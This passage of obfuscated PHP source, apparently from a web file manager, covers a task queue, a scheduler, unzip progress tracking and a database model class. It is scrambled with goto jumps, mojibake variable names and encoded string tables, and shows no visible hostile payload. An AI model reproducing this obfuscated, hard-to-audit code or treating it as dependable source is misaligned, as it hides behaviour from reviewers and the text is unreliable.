>= self::MAX_LENGTH) { return !1; } if ($d ß‹øØ‚ && array_find_by_field(self::$listData, $fŞ–µ‰ˆ™[92], $d ß‹øØ‚)) { return !0; } self::$listData[] = array($fŞ–µ‰ˆ™[260] => $Eƒİ¹¡¦²ì, $fŞ–µ‰ˆ™[1600] => $CØœ‚ÜˆŸ×, $fŞ–µ‰ˆ™[425] => $A¯æíÔØ¸¾, $fŞ–µ‰ˆ™[92] => $d ß‹øØ‚); return !0; } public static function addSubmit() { $aÇİÆ÷ñîæ =& $_SERVER[…ë˜õ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($aÇİÆ÷ñîæ[1601] . json_encode_force(array_to_keyvalue(self::$listData, $aÇİÆ÷ñîæ[33], $aÇİÆ÷ñîæ[425])), $aÇİÆ÷ñîæ[1602]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($a‚ëŸ­á, $EŠä°µ‡ŸŒ = array(), $B†‡¶‰¬Ê = '', $DÙé¯çæÍÈ = '') { goto FîŠÕãÄ–ß; FîŠÕãÄ–ß: $d…âÇİ…ìƒ =& $_SERVER[…ë˜õ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $EÀ±ˆÎ“…æ = self::getAll(); goto dİ´íä®ºæ; dİ´íä®ºæ: if ($DÙé¯çæÍÈ && array_find_by_field($EÀ±ˆÎ“…æ, $d…âÇİ…ìƒ[92], $DÙé¯çæÍÈ)) { return !0; } $EÀ±ˆÎ“…æ[] = array($d…âÇİ…ìƒ[260] => $a‚ëŸ­á, $d…âÇİ…ìƒ[1600] => $EŠä°µ‡ŸŒ, $d…âÇİ…ìƒ[425] => $B†‡¶‰¬Ê, $d…âÇİ…ìƒ[92] => $DÙé¯çæÍÈ); write_log($d…âÇİ…ìƒ[1601] . $B†‡¶‰¬Ê, $d…âÇİ…ìƒ[1602]); goto FŒÑò¹ŸÓ¾; FŒÑò¹ŸÓ¾: self::setAll($EÀ±ˆÎ“…æ); return !0; goto fàœœóƒ•¯; fàœœóƒ•¯: } public static function run() { goto cá•ç¹ œ†; bëË¾ë”Éò: return !0; goto BØÉÛ—›“ê; B¥©ÛÚ ¸: if (!$f¸¼ñ¬ÓÁ¥) { return !1; } self::setAll($a¤¬Ÿ„Ä§Œ); $fÕ‘¡¼Ê¼Š = timeFloat(); goto c×±ä’Ïäá; cá•ç¹ œ†: $B‚Ÿ‰Öˆ¢å =& $_SERVER[…ë˜õ]; $a¤¬Ÿ„Ä§Œ = self::getAll(); $f¸¼ñ¬ÓÁ¥ = array_shift($a¤¬Ÿ„Ä§Œ); goto B¥©ÛÚ ¸; c×±ä’Ïäá: try { Hook::apply($f¸¼ñ¬ÓÁ¥[$B‚Ÿ‰Öˆ¢å[260]], $f¸¼ñ¬ÓÁ¥[$B‚Ÿ‰Öˆ¢å[1600]]); } catch (Exception $fÙ…ˆ˜ÚÇ„) { } $eª­¬Èâ±ã = number_format(timeFloat() - $fÕ‘¡¼Ê¼Š, 3) . $B‚Ÿ‰Öˆ¢å[1544]; write_log($B‚Ÿ‰Öˆ¢å[1603] . $f¸¼ñ¬ÓÁ¥[$B‚Ÿ‰Öˆ¢å[425]] . $B‚Ÿ‰Öˆ¢å[1604] . $eª­¬Èâ±ã, $B‚Ÿ‰Öˆ¢å[1602]); goto bëË¾ë”Éò; BØÉÛ—›“ê: } public static function count() { $DÀÑ§áÅ±Š = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$DÀÑ§áÅ±Š) { return 0; } return intval($DÀÑ§áÅ±Š); } public static function getAll() { $câêÇä•ÕÂ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$câêÇä•ÕÂ) { return array(); } return $câêÇä•ÕÂ; } public static function setAll($b«ÛÑÙìæÄ) { $b©°‹ñ‡Îù = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($b«ÛÑÙìæÄ), $b©°‹ñ‡Îù); Cache::set(self::QUEUE_DATA, $b«ÛÑÙìæÄ, $b©°‹ñ‡Îù); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($aÄõ‘¡£±ø, $bë‹İ¢İŞğ = 5.0) { if (!$aÄõ‘¡£±ø) { return; } $AƒªÖÈ‹‹ = Cache::get($aÄõ‘¡£±ø); if (!$AƒªÖÈ‹‹ || timeFloat() - floatVal($AƒªÖÈ‹‹) >= $bë‹İ¢İŞğ) { Cache::set($aÄõ‘¡£±ø, timeFloat(), $bë‹İ¢İŞğ * 10); return !0; } return !1; } public static function timeLimitCall($f±Ë›·…œ, $EŒĞ¹Ş£Ï, $a«¹À‰¸, $E¤ùÇÖ¸Ñï = 5.0) { goto eÛÃîñŞ½; eÛÃîñŞ½: $d¿ƒ¢óÙˆİ =& $_SERVER[…ë˜õ]; if (!$f±Ë›·…œ || !$EŒĞ¹Ş£Ï) { return; } self::$asyncAdd = !0; goto eÍÅí²™×Æ; C¤¿¾âºÁ†: if (is_array($D–ºìÉ«˜¸[$f±Ë›·…œ])) { $Fœ¹¼Á‹Ó˜[$d¿ƒ¢óÙˆİ[1607]] = $D–ºìÉ«˜¸[$f±Ë›·…œ][$d¿ƒ¢óÙˆİ[1607]]; } if (is_array($D–ºìÉ«˜¸[$f±Ë›·…œ])) { if (timeFloat() - $D–ºìÉ«˜¸[$f±Ë›·…œ][$d¿ƒ¢óÙˆİ[1606]] < $Fœ¹¼Á‹Ó˜[$d¿ƒ¢óÙˆİ[195]] * 0.3) { return; } $Fœ¹¼Á‹Ó˜[$d¿ƒ¢óÙˆİ[1607]] = $D–ºìÉ«˜¸[$f±Ë›·…œ][$d¿ƒ¢óÙˆİ[1607]]; } $D–ºìÉ«˜¸[$f±Ë›·…œ] = $Fœ¹¼Á‹Ó˜; goto E¡î‚Ú‘‘¹; E¡î‚Ú‘‘¹: Cache::set($bŸ°ÓñÖÌá, $D–ºìÉ«˜¸, 60); Cache::removeMemory($bŸ°ÓñÖÌá); write_log($d¿ƒ¢óÙˆİ[1608] . $f±Ë›·…œ . $d¿ƒ¢óÙˆİ[67] . $EŒĞ¹Ş£Ï, $d¿ƒ¢óÙˆİ[1602]); goto câÚÛ‹±Ÿ½; eÍÅí²™×Æ: $bŸ°ÓñÖÌá = $d¿ƒ¢óÙˆİ[1605]; $D–ºìÉ«˜¸ = Cache::get($bŸ°ÓñÖÌá, !0); $Fœ¹¼Á‹Ó˜ = array($d¿ƒ¢óÙˆİ[1606] => timeFloat(), $d¿ƒ¢óÙˆİ[1607] => timeFloat(), $d¿ƒ¢óÙˆİ[260] => $EŒĞ¹Ş£Ï, $d¿ƒ¢óÙˆİ[1600] => $a«¹À‰¸, $d¿ƒ¢óÙˆİ[195] => $E¤ùÇÖ¸Ñï); goto C¤¿¾âºÁ†; câÚÛ‹±Ÿ½: } public static function timeLimitCallLoop() { goto a’²³Áİ; EÄ‚ŒçÃ„: if (!$Aè·„÷²¡Â) { return Cache::remove($DØªÊÊğÏŞ); } Cache::set($DØªÊÊğÏŞ, $Aè·„÷²¡Â, 60); Cache::removeMemory($DØªÊÊğÏŞ); goto b¨ÁñæŞ¦­; e™ò·„äš‹: if (!$E‚éÃ§Ã¿ && !self::$asyncAdd) { return; } $DØªÊÊğÏŞ = $cÃÌ«›ƒï‰[1605]; $e¶ÄÕ˜ßóÃ = Cache::get($DØªÊÊğÏŞ, !0); goto C‹«ŞŒã²ì; a’²³Áİ: $cÃÌ«›ƒï‰ =& $_SERVER[…ë˜õ]; $CŸ Ò†æŞÛ = array($cÃÌ«›ƒï‰[1609]); $E‚éÃ§Ã¿ = in_array(strtolower(ACTION), $CŸ Ò†æŞÛ); goto e™ò·„äš‹; C‹«ŞŒã²ì: if (!$e¶ÄÕ˜ßóÃ || count($e¶ÄÕ˜ßóÃ) <= 0) { return; } $b¹–®¿¾îö = !1; $Ağ—ÈôÃ³ = timeFloat(); goto e²¯¢×¸¬é; e²¯¢×¸¬é: $Aè·„÷²¡Â = array(); foreach ($e¶ÄÕ˜ßóÃ as $b£¢‘´ÅÃ => $Bğ‚æÙá¾„) { if ($Ağ—ÈôÃ³ - $Bğ‚æÙá¾„[$cÃÌ«›ƒï‰[1607]] > $Bğ‚æÙá¾„[$cÃÌ«›ƒï‰[195]]) { $b¹–®¿¾îö = !0; try { Hook::apply($Bğ‚æÙá¾„[$cÃÌ«›ƒï‰[260]], $Bğ‚æÙá¾„[$cÃÌ«›ƒï‰[1600]]); write_log($cÃÌ«›ƒï‰[1610] . $b£¢‘´ÅÃ . $cÃÌ«›ƒï‰[67] . $Bğ‚æÙá¾„[$cÃÌ«›ƒï‰[260]] . $cÃÌ«›ƒï‰[1611] . ACTION, $cÃÌ«›ƒï‰[1602]); } catch (Exception $C‹‡ìòğ‚Æ) { } continue; } $Aè·„÷²¡Â[$b£¢‘´ÅÃ] = $Bğ‚æÙá¾„; } if (!$b¹–®¿¾îö) { return; } goto EÄ‚ŒçÃ„; b¨ÁñæŞ¦­: } public static function finished($bø…è÷¸Ù, $AÂ×ÃóØø) { $AÓç³¹Êœ =& $_SERVER[…ë˜õ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($AÓç³¹Êœ[260] => $bø…è÷¸Ù, $AÓç³¹Êœ[1600] => $AÂ×ÃóØø); } private static function finishedRun() { $a¼´ÎÃÌ =& $_SERVER[…ë˜õ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $d®×¶øİ…‰) { try { Hook::apply($d®×¶øİ…‰[$a¼´ÎÃÌ[260]], $d®×¶øİ…‰[$a¼´ÎÃÌ[1600]]); } catch (Exception $c¹œš½ô®Ö) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Cò¢“º×Ğ; bˆÛõ–ÃÑæ: Hook::bind($F’¯ª ÂĞß[1094], array($this, $F’¯ª ÂĞß[1614])); $Eá–”ó†Ö =& $this->task; $Eá–”ó†Ö[$F’¯ª ÂĞß[1615]] = $F’¯ª ÂĞß[1099]; goto a¬Ç©Ö›Œ²; Cò¢“º×Ğ: $F’¯ª ÂĞß =& $_SERVER[…ë˜õ]; parent::startAfter(); Hook::bind($F’¯ª ÂĞß[1612], array($this, $F’¯ª ÂĞß[1613])); goto bˆÛõ–ÃÑæ; a¬Ç©Ö›Œ²: if (!$Eá–”ó†Ö[$F’¯ª ÂĞß[1436]]) { $Eá–”ó†Ö[$F’¯ª ÂĞß[1436]] = LNG($F’¯ª ÂĞß[1616]); } goto f˜®ĞÂÇ´‹; f˜®ĞÂÇ´‹: } protected function endAfter() { $Fš÷Ñ„¯ñœ =& $_SERVER[…ë˜õ]; parent::endAfter(); Hook::unbind($Fš÷Ñ„¯ñœ[1612], array($this, $Fš÷Ñ„¯ñœ[1613])); Hook::unbind($Fš÷Ñ„¯ñœ[1094], array($this, $Fš÷Ñ„¯ñœ[1614])); } public function updateAfter() { $bÔ¢¯ª¢Ğ =& $_SERVER[…ë˜õ]; $EâÅ‘­Ü’ =& $this->task; if (!$EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1027]] || !$EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[740]]) { return; } if ($EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1615]] == $bÔ¢¯ª¢Ğ[1099]) { $Dñø“‘–Û‰ = 0; if ($EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1574]]) { $Dñø“‘–Û‰ = $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1575]] / $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1574]]; } $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1532]] = $Dñø“‘–Û‰ * 0.3; } else { if ($EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1615]] == $bÔ¢¯ª¢Ğ[309]) { $Dñø“‘–Û‰ = $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1041]] / $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1027]]; $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1532]] = 0.3 + $Dñø“‘–Û‰ * 0.4; } else { if ($EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1615]] == $bÔ¢¯ª¢Ğ[106]) { $aß…Š¢ê‹½ = 0; if ($EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1576]] == $bÔ¢¯ª¢Ğ[106]) { $aß…Š¢ê‹½ = $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1575]]; } $Dñø“‘–Û‰ = ($EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1579]] + $aß…Š¢ê‹½) / $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[740]]; $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1532]] = 0.3 + 0.4 + $Dñø“‘–Û‰ * 0.3; } } } if ($EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1532]] > 0) { $DŞ¢ßÃ®Äª = timeFloat() - $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[762]] - $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1535]]; $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1536]] = $DŞ¢ßÃ®Äª * (1 - $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1532]]) / $EâÅ‘­Ü’[$bÔ¢¯ª¢Ğ[1532]]; } } public function addFile($A†î¤ÃŒ¢) { goto cÌ„™ùÒË¡; aØø¥¹Â…„: $this->update(); goto CˆÑ²öÈ†¯; cÌ„™ùÒË¡: $cê†­İƒù² =& $_SERVER[…ë˜õ]; $EÕï¿òï´† =& $this->task; $dŠóº¯Ûà¯ = IO::info($A†î¤ÃŒ¢); goto FˆÏĞ¤Ïâó; FˆÏĞ¤Ïâó: $EÕï¿òï´†[$cê†­İƒù²[1572]] = $dŠóº¯Ûà¯[$cê†­İƒù²[28]]; $EÕï¿òï´†[$cê†­İƒù²[1574]] = $dŠóº¯Ûà¯[$cê†­İƒù²[77]]; $EÕï¿òï´†[$cê†­İƒù²[1575]] = 0; goto dë²è«´; d™ˆõ‡Ë±ò: $EÕï¿òï´†[$cê†­İƒù²[1027]] = 1; $fµÖ™¸ï¥‰ = 0; $EÕï¿òï´†[$cê†­İƒù²[1583]] = array($cê†­İƒù²[1584] => $fµÖ™¸ï¥‰ + 1, $cê†­İƒù²[407] => $dŠóº¯Ûà¯[$cê†­İƒù²[28]], $cê†­İƒù²[75] => $dŠóº¯Ûà¯[$cê†­İƒù²[75]], $cê†­İƒù²[489] => $dŠóº¯Ûà¯[$cê†­İƒù²[489]] ? $dŠóº¯Ûà¯[$cê†­İƒù²[489]] : $dŠóº¯Ûà¯[$cê†­İƒù²[75]]); goto aØø¥¹Â…„; dë²è«´: $EÕï¿òï´†[$cê†­İƒù²[1029]] = $cê†­İƒù²[1591]; $EÕï¿òï´†[$cê†­İƒù²[1576]] = $cê†­İƒù²[1099]; $EÕï¿òï´†[$cê†­İƒù²[740]] = $dŠóº¯Ûà¯[$cê†­İƒù²[77]]; goto d™ˆõ‡Ë±ò; CˆÑ²öÈ†¯: } public function unzipAfter($d„Á¸÷›ƒÈ) { goto DÁéÁ±ËÛ; D½÷õáÄ·: if ($aé–¥ÏĞ«î[$C‹²³¤õ´[29]] == $C‹²³¤õ´[191]) { $C†Åî÷º‹[$C‹²³¤õ´[1027]] = 1; } else { $C†Åî÷º‹[$C‹²³¤õ´[1027]] = $aé–¥ÏĞ«î[$C‹²³¤õ´[80]][$C‹²³¤õ´[78]]; } $C†Åî÷º‹[$C‹²³¤õ´[1029]] = $C‹²³¤õ´[33]; $C†Åî÷º‹[$C‹²³¤õ´[1576]] = 0; goto Cº©÷¥ƒ¡; CáœÉ—é: $this->update(); self::log($C‹²³¤õ´[1617] . json_encode(array($C†Åî÷º‹, $aé–¥ÏĞ«î))); goto e¥°š§Ïˆ„; Bæ¢ä±Æ: $aé–¥ÏĞ«î = IO::infoWithChildren($d„Á¸÷›ƒÈ); $B‡å•£ê¨è = 0; $C†Åî÷º‹[$C‹²³¤õ´[1583]] = array($C‹²³¤õ´[1584] => $B‡å•£ê¨è + 1, $C‹²³¤õ´[407] => $aé–¥ÏĞ«î[$C‹²³¤õ´[28]], $C‹²³¤õ´[75] => $aé–¥ÏĞ«î[$C‹²³¤õ´[75]], $C‹²³¤õ´[489] => $aé–¥ÏĞ«î[$C‹²³¤õ´[489]] ? $aé–¥ÏĞ«î[$C‹²³¤õ´[489]] : $aé–¥ÏĞ«î[$C‹²³¤õ´[75]]); goto D½÷õáÄ·; DÁéÁ±ËÛ: $C‹²³¤õ´ =& $_SERVER[…ë˜õ]; $C†Åî÷º‹ =& $this->task; $C†Åî÷º‹[$C‹²³¤õ´[1615]] = $C‹²³¤õ´[106]; goto Bæ¢ä±Æ; Cº©÷¥ƒ¡: $C†Åî÷º‹[$C‹²³¤õ´[1041]] = 0; $C†Åî÷º‹[$C‹²³¤õ´[1574]] = 0; $C†Åî÷º‹[$C‹²³¤õ´[1575]] = 0; goto eÅä™ˆãŒ ; eÅä™ˆãŒ : $C†Åî÷º‹[$C‹²³¤õ´[1572]] = $C‹²³¤õ´[33]; $C†Åî÷º‹[$C‹²³¤õ´[1579]] = 0; $C†Åî÷º‹[$C‹²³¤õ´[740]] = $aé–¥ÏĞ«î[$C‹²³¤õ´[77]]; goto CáœÉ—é; e¥°š§Ïˆ„: } public function nameParse($E³ŒÔÛ˜¾…) { goto c°öÔ¨©Íë; fƒÕ”ï•¹: $Bï“äÓãÈ¡ = get_path_this($E³ŒÔÛ˜¾…); if (strstr($Bï“äÓãÈ¡, $B±ø‡àá²›[94])) { $BİËÔÅ´[$B±ø‡àá²›[1041]] += 1; $BİËÔÅ´[$B±ø‡àá²›[1027]] += 1; } $BİËÔÅ´[$B±ø‡àá²›[1572]] = $E³ŒÔÛ˜¾…; goto bêˆŞñÍøî; bêˆŞñÍøî: $this->update(); goto D½…”ºí£; c°öÔ¨©Íë: $B±ø‡àá²› =& $_SERVER[…ë˜õ]; $BİËÔÅ´ =& $this->task; if ($BİËÔÅ´[$B±ø‡àá²›[1615]] == $B±ø‡àá²›[1099]) { $BİËÔÅ´[$B±ø‡àá²›[1615]] = $B±ø‡àá²›[309]; $BİËÔÅ´[$B±ø‡àá²›[1579]] = 0; $BİËÔÅ´[$B±ø‡àá²›[740]] = 0; } goto fƒÕ”ï•¹; D½…”ºí£: } } goto AÉ†‘ØªÇ; aíèóùµæ: function binCheckBigger($bÆŠ·å²ãš, $e™çŒ¶…Ã) { return $bÆŠ·å²ãš > $e™çŒ¶…Ã; } $_SERVER[$_SERVER[ñ¯»Æ«í³][3]] = ("\70\71\70\65"."\x35\x35")+0;$_TzDi="6h9tyPMc4SvN3RdjIZaBteAJIkzQYb9xQ5fmiqNV32SgGcQsXT3GwcPkGM3m6HW2FJaK72AunSbhpZhX";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($bëáé£›¦, $fµÑÇ‘·àÅ) { $Bäçâ¹Ä‘Ğ =& $_SERVER[…ë˜õ]; if (isset(self::$_methodList[$bëáé£›¦])) { return @call_user_func_array(self::$_methodList[$bëáé£›¦], $fµÑÇ‘·àÅ); } else { if (method_exists($this, $bëáé£›¦)) { return call_user_func_array(array($this, $bëáé£›¦), $fµÑÇ‘·àÅ); } else { think_exception(__CLASS__ . $Bäçâ¹Ä‘Ğ[4] . $bëáé£›¦ . $Bäçâ¹Ä‘Ğ[5]); } } } public static function __callStatic($D¸»øÕè—, $bàÜŸƒ¢à÷) { if (isset(self::$_methodListStatic[$D¸»øÕè—])) { return call_user_func_array(self::$_methodListStatic[$D¸»øÕè—], $bàÜŸƒ¢à÷); } else { if (method_exists(self, $D¸»øÕè—)) { return call_user_func_array(array(self, $D¸»øÕè—), $bàÜŸƒ¢à÷); } else { show_json("{$D¸»øÕè—}\x28\51\40\x6e\x6f\x74\x20\x65\x78\x69\x73\164\x3b", !1); } } } public static function addMethod($E¶˜‘›Ùç, $EÎŒ•Ø¯á) { self::$_methodList[$E¶˜‘›Ùç] = $EÎŒ•Ø¯á; } public static function addMethodStatic($fŞŠ—Ìô‚Ò, $a‹í¥ï½‚…) { self::$_methodListStatic[$fŞŠ—Ìô‚Ò] = $a‹í¥ï½‚…; } } goto DßßÃÖ–“–; a‘±»Ñ÷º‚: define($_SERVER[…ë˜õ][238], 0); define($_SERVER[…ë˜õ][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\157\162\144\145\x72", "\141\x6c\151\141\163", "\x68\141\x76\151\156\x67", "\147\162\x6f\165\x70", "\x6c\157\143\x6b", "\144\x69\x73\164\151\156\x63\164", "\x61\165\164\157", "\146\151\154\164\x65\162", "\166\141\x6c\151\x64\141\164\145", "\x72\x65\163\165\x6c\164", "\142\151\156\x64", "\x74\x6f\153\x65\156"); public function __construct($fá£ ‰’’í = '', $F¹«œÃñê = '', $c¿Öïé½ø„ = '') { $B÷™ØÊ…Ó­ =& $_SERVER[…ë˜õ]; $this->_initialize(); if (!empty($fá£ ‰’’í)) { if (strpos($fá£ ‰’’í, $B÷™ØÊ…Ó­[94])) { list($this->dbName, $this->name) = explode($B÷™ØÊ…Ó­[94], $fá£ ‰’’í); } else { $this->name = $fá£ ‰’’í; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F¹«œÃñê)) { $this->tablePrefix = $B÷™ØÊ…Ó­[33]; } elseif ($B÷™ØÊ…Ó­[33] != $F¹«œÃñê) { $this->tablePrefix = $F¹«œÃñê; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($B÷™ØÊ…Ó­[240]); } $this->db(0, empty($this->connection) ? $c¿Öïé½ø„ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $dƒŸöÒù‡ =& $_SERVER[…ë˜õ]; if (empty($this->fields)) { if (think_config($dƒŸöÒù‡[241])) { $b‘Ì´À›ì = $this->dbName ? $this->dbName : think_config($dƒŸöÒù‡[242]); $c‹Ÿö­© = think_var_cache($dƒŸöÒù‡[243] . strtolower(get_path_this($b‘Ì´À›ì) . $dƒŸöÒù‡[94] . $this->name)); if ($c‹Ÿö­©) { $c¥¥ß“ÈÖ = think_config($dƒŸöÒù‡[244]); if (empty($c¥¥ß“ÈÖ) || $c‹Ÿö­©[$dƒŸöÒù‡[245]] == $c¥¥ß“ÈÖ) { $this->fields = $c‹Ÿö­©; return; } } } $this->flush(); } } public function flush() { goto CóÂåƒí‚³; CóÂåƒí‚³: $A…ç§…âµ× =& $_SERVER[…ë˜õ]; $this->db->setModel($this->name); $EÊ£“œÎÕ = $this->db->getFields($this->getTableName()); goto Eá‡İÊÅ¬; Eá‡İÊÅ¬: if (!$EÊ£“œÎÕ) { return !1; } $this->fields = array_keys($EÊ£“œÎÕ); $this->fields[$A…ç§…âµ×[246]] = !1; goto d†„ç‚ƒŞ; d†„ç‚ƒŞ: foreach ($EÊ£“œÎÕ as $D‰´·Ğ’‚‰ => $a’²©èºï–) { $C‹Ä¤¸ÖÀ[$D‰´·Ğ’‚‰] = $a’²©èºï–[$A…ç§…âµ×[29]]; if ($a’²©èºï–[$A…ç§…âµ×[36]]) { $this->fields[$A…ç§…âµ×[247]] = $D‰´·Ğ’‚‰; if ($a’²©èºï–[$A…ç§…âµ×[39]]) { $this->fields[$A…ç§…âµ×[246]] = !0; } } } $this->fields[$A…ç§…âµ×[248]] = $C‹Ä¤¸ÖÀ; if (think_config($A…ç§…âµ×[244])) { $this->fields[$A…ç§…âµ×[245]] = think_config($A…ç§…âµ×[244]); } goto E áÔ¨å³; E áÔ¨å³: if (think_config($A…ç§…âµ×[241])) { $f¥İä¬Àá = $this->dbName ? $this->dbName : think_config($A…ç§…âµ×[242]); think_var_cache($A…ç§…âµ×[243] . strtolower(get_path_this($f¥İä¬Àá) . $A…ç§…âµ×[94] . $this->name), $this->fields); } goto e™Ç·Ù’Ë¤; e™Ç·Ù’Ë¤: } public function switchModel($AáŒŸ˜àÍ“, $d›—‘§ñ¨ = array()) { $EºÚŠƒîÍ£ =& $_SERVER[…ë˜õ]; $eà—Óá„Ë = ucwords(strtolower($AáŒŸ˜àÍ“)) . $EºÚŠƒîÍ£[249]; if (!class_exists($eà—Óá„Ë)) { think_exception($eà—Óá„Ë . think_lang($EºÚŠƒîÍ£[250])); } $this->_extModel = new $eà—Óá„Ë($this->name); if (!empty($d›—‘§ñ¨)) { foreach ($d›—‘§ñ¨ as $E¥Úêô÷œ) { $this->_extModel->setProperty($E¥Úêô÷œ, $this->{$E¥Úêô÷œ}); } } return $this->_extModel; } public function __set($Bãš¥¦«Â±, $cî¬ Íµßî) { $this->data[$Bãš¥¦«Â±] = $cî¬ Íµßî; } public function __get($cïŸ­®§˜) { return isset($this->data[$cïŸ­®§˜]) ? $this->data[$cïŸ­®§˜] : null; } public function __isset($dàÓœÎÑì×) { return isset($this->data[$dàÓœÎÑì×]); } public function __unset($e¥Ÿº®Ø“) { unset($this->data[$e¥Ÿº®Ø“]); } public function __call($Eß¨İÚæÂŸ, $A‡½¨œ‡ Å) { $AÇ£¢Á =& $_SERVER[…ë˜õ]; if (in_array(strtolower($Eß¨İÚæÂŸ), $this->methods, !0)) { $this->options[strtolower($Eß¨İÚæÂŸ)] = $A‡½¨œ‡ Å[0]; return $this; } elseif (in_array(strtolower($Eß¨İÚæÂŸ), array($AÇ£¢Á[251], $AÇ£¢Á[252], $AÇ£¢Á[253], $AÇ£¢Á[254], $AÇ£¢Á[255]), !0)) { $A­ÜÄŸìÍ = isset($A‡½¨œ‡ Å[0]) ? $A‡½¨œ‡ Å[0] : $AÇ£¢Á[181]; $A­ÜÄŸìÍ = $this->db->parseKey($A­ÜÄŸìÍ); return $this->getField(strtoupper($Eß¨İÚæÂŸ) . $AÇ£¢Á[256] . $A­ÜÄŸìÍ . $AÇ£¢Á[257] . $Eß¨İÚæÂŸ, $AÇ£¢Á[251]); } elseif (strtolower(substr($Eß¨İÚæÂŸ, 0, 5)) == $AÇ£¢Á[258]) { $A­ÜÄŸìÍ = think_parse_name(substr($Eß¨İÚæÂŸ, 5)); $fÜ×ïÉï[$A­ÜÄŸìÍ] = $A‡½¨œ‡ Å[0]; return $this->where($fÜ×ïÉï)->find(); } elseif (strtolower(substr($Eß¨İÚæÂŸ, 0, 10)) == $AÇ£¢Á[259]) { $f³Û®Ó¶Ø = think_parse_name(substr($Eß¨İÚæÂŸ, 10)); $fÜ×ïÉï[$f³Û®Ó¶Ø] = $A‡½¨œ‡ Å[0]; return $this->where($fÜ×ïÉï)->getField($A‡½¨œ‡ Å[1]); } elseif (isset($this->_scope[$Eß¨İÚæÂŸ])) { return $this->scope($Eß¨İÚæÂŸ, $A‡½¨œ‡ Å[0]); } elseif (method_exists($this, $Eß¨İÚæÂŸ)) { array_unshift($A‡½¨œ‡ Å, $Eß¨İÚæÂŸ); return call_user_func_array(array($this, $AÇ£¢Á[260]), $A‡½¨œ‡ Å); } else { return call_user_func_array(array(parent, $Eß¨İÚæÂŸ), $A‡½¨œ‡ Å); } } protected function call() { goto eˆ‘âµõ³; eƒßñïàá: if (isset($aîñ°Òª˜«[$dË®í®£±Ÿ]) && $aîñ°Òª˜«[$dË®í®£±Ÿ] === $ağ¼Ûé‰±) { think_exception(__CLASS__ . $B ˜ÁÛÉÚ†[4] . $ağ¼Ûé‰± . think_lang($B ˜ÁÛÉÚ†[261])); return; } $aîñ°Òª˜«[] = $ağ¼Ûé‰±; if (method_exists($this, $B ˜ÁÛÉÚ†[262])) { $c³…‰¦ÒÁ† = call_user_func_array(array($this, $B ˜ÁÛÉÚ†[263]), array($EÊ¿²êì¹Ç, $aîñ°Òª˜«)); if (!is_null($c³…‰¦ÒÁ†) && $c³…‰¦ÒÁ† !== !1) { return $c³…‰¦ÒÁ†; } } goto D‰ÛÊ›ÉÓê; F÷÷†ÆäÄÃ: $EÊ¿²êì¹Ç = $ağ¼Ûé‰±; if (is_array($ağ¼Ûé‰±)) { $EÊ¿²êì¹Ç = $ağ¼Ûé‰±[1]; $ağ¼Ûé‰± = $ağ¼Ûé‰±[0]; } $dË®í®£±Ÿ = count($aîñ°Òª˜«) - 1; goto eƒßñïàá; eˆ‘âµõ³: $B ˜ÁÛÉÚ† =& $_SERVER[…ë˜õ]; $aîñ°Òª˜« = func_get_args(); $ağ¼Ûé‰± = array_shift($aîñ°Òª˜«); goto F÷÷†ÆäÄÃ; D‰ÛÊ›ÉÓê: $AÄ‰Ï¼Åó· = call_user_func_array(array($this, $ağ¼Ûé‰±), $aîñ°Òª˜«); if (method_exists($this, $B ˜ÁÛÉÚ†[264])) { $c³…‰¦ÒÁ† = call_user_func_array(array($this, $B ˜ÁÛÉÚ†[265]), array($EÊ¿²êì¹Ç, $aîñ°Òª˜«, $AÄ‰Ï¼Åó·)); if ($c³…‰¦ÒÁ†) { return $c³…‰¦ÒÁ†; } } return $AÄ‰Ï¼Åó·; goto B‘½¡ÓÓ±¶; B‘½¡ÓÓ±¶: } protected function _initialize() { } protected function 